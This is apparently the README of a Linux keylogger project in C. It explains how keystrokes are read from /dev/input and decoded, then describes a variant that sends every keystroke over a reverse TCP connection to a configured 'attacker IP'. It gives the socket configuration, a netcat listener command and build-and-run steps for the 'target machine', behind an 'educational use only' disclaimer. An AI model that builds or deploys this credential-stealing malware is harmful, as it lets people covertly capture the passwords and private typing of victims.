# Linux Keylogger (C)

A low-level Linux keyboard event logger written in C, with an optional variant that exfiltrates keystrokes over a reverse TCP connection.

---

> [!WARNING] Educational Use Only
>
> This project was developed strictly for educational and research purposes — understanding how the Linux input subsystem works and how keyloggers are built, for use in authorized penetration testing lab environments only.
>
> Deploying this software on any system without explicit written authorization from the owner is illegal and unethical. Unauthorized use may violate computer fraud laws including but not limited to the Egyptian Cybercrime Law No. 175 of 2018, the Computer Fraud and Abuse Act (CFAA), and equivalent legislation in your jurisdiction.
>
>The author assumes no responsibility for any misuse of this code.

---

## How It Works

### Linux Input Subsystem

Linux exposes every input device as an event file under `/dev/input/`. USB devices also get stable symlinks under `/dev/input/by-id/`. For example:

```
cd /dev/input/by-id
ls -lh
# usb-Usb_KeyBoard_Usb_KeyBoard-event-kbd -> ../event6
```

The kernel writes raw `input_event` structs to these files continuously. The header defining this struct is at:

```
/usr/include/linux/input.h
```

Reference: [Linux Kernel Input Event Codes](https://docs.kernel.org/input/event-codes.html)

### `struct input_event`

Each event carries three fields relevant here:

| Field  | Type     | Meaning                          |
|--------|----------|----------------------------------|
| `type` | `__u16`  | Event category (`EV_KEY` = 0x01) |
| `code` | `__u16`  | Key identifier (`KEY_A`, etc.)   |
| `value`| `__s32`  | Key state (see below)            |

**EV_KEY values:**

| Value | Meaning       |
|-------|---------------|
| `0`   | Key release   |
| `1`   | Key press     |
| `2`   | Key autorepeat|

The logger filters for `type == EV_KEY` and only acts on `value == 1` (press) or `value == 2` (autorepeat).

---

## Key Resolution Logic

`resolve_key(__u16 code, bool shift, bool caps)` maps a raw key code to its ASCII character, applying modifier state:

```c
bool upper = shift ^ caps;
```

- **Letters** — XOR between Shift and CapsLock determines case.
- **Digits/symbols** — Shift only; CapsLock has no effect.
- **Numpad keys** — always return their face value regardless of modifiers.
- **Special keys** (arrows, F-keys, ESC, etc.) — returned as bracketed labels: `[ESC]`, `[F1]`, `[UP]`, etc.
- **Silent modifiers** — Ctrl and Shift return `NULL` from `special_key_name()`; they are tracked in state booleans but produce no output.

---

## Modifier State Tracking

```c
bool left_shift = false, right_shift = false, caps = false;

if (ie.code == KEY_LEFTSHIFT)  left_shift  = (ie.value != 0);
if (ie.code == KEY_RIGHTSHIFT) right_shift = (ie.value != 0);
if (ie.code == KEY_CAPSLOCK && ie.value == 1) caps = !caps;
```

Shift state tracks both press and release (value 0 clears it). CapsLock toggles on press only.

---

## Variants

### `keylogger.c` — Local (stdout)

Takes the event device path as a CLI argument and writes decoded keystrokes to stdout.

```sh
gcc -Wall -Wextra -g  keylogger.c  -o keylogger 
sudo ./keylogger /dev/input/event6
```

Output is flushed after every character with `fflush(stdout)` to avoid buffering delay.

### `keylogger_ReverseConnection.c` — Reverse TCP Shell

Instead of writing to stdout, wraps a TCP socket in a `FILE*` and sends keystrokes to a remote listener.

Configure before compiling:

```c
int port = 4443;                           // listener port
revsockaddr.sin_addr.s_addr = inet_addr("192.168.56.1");  // attacker IP
```

The input device is hardcoded to `/dev/input/event0` — change as needed.

**Listener setup (attacker machine):**

```sh
nc -lvnp 4443
```

**Compile and run (target machine):**

```sh
gcc -Wall -Wextra -g keylogger_ReverseConnection.c -o keylogger_rc
sudo ./keylogger_rc
```

Keystrokes stream to the netcat session in real time.

---

## Build

Both files require no external dependencies beyond standard Linux headers.

```sh
# Local variant
gcc keylogger.c -o keylogger

# Reverse connection variant
gcc keylogger_ReverseConnection.c -o keylogger_rc
```

Requires root (or membership in the `input` group) to read from `/dev/input/`.

---

## Architecture Diagram

```
┌─────────────────────────────────┐
│         Physical Keyboard       │
└────────────────┬────────────────┘
                 │ USB HID
                 ▼
┌─────────────────────────────────┐
│      Linux Input Subsystem      │
│  /dev/input/by-id/...-event-kbd │
│       (struct input_event)      │
└────────────────┬────────────────┘
                 │ read()
                 ▼
┌─────────────────────────────────┐
│         keylogger process       │
│  filter EV_KEY, value 1|2       │
│  resolve_key() / modifier state │
└────────┬────────────────────────┘
         │
   ┌─────┴──────────────────────┐
   │                            │
   ▼                            ▼
stdout / file             TCP socket
(keylogger.c)     (keylogger_ReverseConnection.c)
                          │
                          ▼
                   nc -lvnp 4443
                  (attacker machine)
```

---

## References

- [Linux Kernel Input Event Codes](https://docs.kernel.org/input/event-codes.html)
- `/usr/include/linux/input.h`
- `/usr/include/linux/input-event-codes.h`
- `man 4 input`
